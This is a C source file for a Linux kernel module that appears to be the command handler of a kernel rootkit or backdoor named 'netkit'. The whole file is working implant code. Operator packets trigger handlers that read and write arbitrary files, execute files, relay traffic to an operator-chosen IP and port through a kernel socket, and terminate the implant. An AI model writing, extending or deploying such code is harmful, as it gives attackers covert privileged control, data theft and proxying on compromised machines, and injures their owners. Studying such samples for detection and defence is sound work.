#include <linux/types.h>
#include <linux/module.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/syscalls.h>

#include "handlers.h"

#include "../packet/packet.h"
#include "../../sys/mem.h"
#include "../../sys/socket.h"
#include "../../sys/file.h"
#include "../../netkit.h"
#include "../../sys/symbol.h"

int cmd_handle_file_read(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
{
    size_t filename_len;
    char *filename;
    int retv;

    // mitigate vuln when no nb and packet->content_len = CHUNK_SIZE
    filename_len = packet->content_len + 1;
    filename = kzmalloc(filename_len, GFP_KERNEL);
    if (IS_ERR(filename))
        return PTR_ERR(filename);

    memcpy(filename, packet->content, filename_len - 1);
    filename[filename_len - 1] = '\x00'; // add nullbyte

    retv = file_read(filename, res_buf, res_buflen);
    
    kzfree(filename, filename_len);
    
    return retv;
}

int cmd_handle_file_write(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
{
    size_t filename_len;
    char *filename;
    size_t content_len;
    int retv;

    // mitigate vuln when no nb and packet->content_len = CHUNK_SIZE
    filename_len = strnlen(packet->content, packet->content_len) + 1;
    filename = kzmalloc(filename_len, GFP_KERNEL);
    if (IS_ERR(filename))
        return PTR_ERR(filename);

    memcpy(filename, packet->content, filename_len - 1);
    filename[filename_len - 1] = '\x00'; // add nullbyte

    // when filename_len == packet->content_len+1, i.e. content doesn't include nb
    content_len = packet->content_len - filename_len;
    if (content_len == SIZE_MAX)
        content_len = 0;

    retv = file_write(filename, packet->content + filename_len, content_len);
    
    kzfree(filename, filename_len);
    
    return retv;
}

int cmd_handle_file_exec(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
{
    size_t filename_len;
    char *filename;
    int retv;

    // mitigate vuln when no nb and packet->content_len = CHUNK_SIZE
    filename_len = packet->content_len + 1;
    filename = kzmalloc(filename_len, GFP_KERNEL);
    if (IS_ERR(filename))
        return PTR_ERR(filename);

    memcpy(filename, packet->content, filename_len - 1);
    filename[filename_len - 1] = '\x00'; // add nullbyte

    retv = file_exec(filename, res_buf, res_buflen);
    
    kzfree(filename, filename_len);
    
    return retv;
}

int cmd_handle_proxy(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
{
    static struct socket *sock;
    struct sockaddr_in *addr;
    int retv = 0;

    if (packet->content_len < 6)
    {
        retv = -EMSGSIZE;
        goto LAB_OUT_NO_SOCK;
    }

    retv = socket_create(*(__be32*)packet->content, *(unsigned short*)(packet->content+4), &sock, &addr);
    if (retv < 0)
        goto LAB_OUT_NO_SOCK;
    
    retv = socket_connect(sock, addr);
    if (retv < 0)
        goto LAB_OUT;
    
    retv = socket_write(sock, packet->content+6, packet->content_len-6);
    if (retv < 0)
        goto LAB_OUT;

    retv = socket_read(sock, res_buf, res_buflen);

LAB_OUT:
    sock_release(sock);
    kzfree(addr, sizeof(*addr));
LAB_OUT_NO_SOCK:
    return retv;
}

int cmd_handle_exit(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
{

    return -1;
}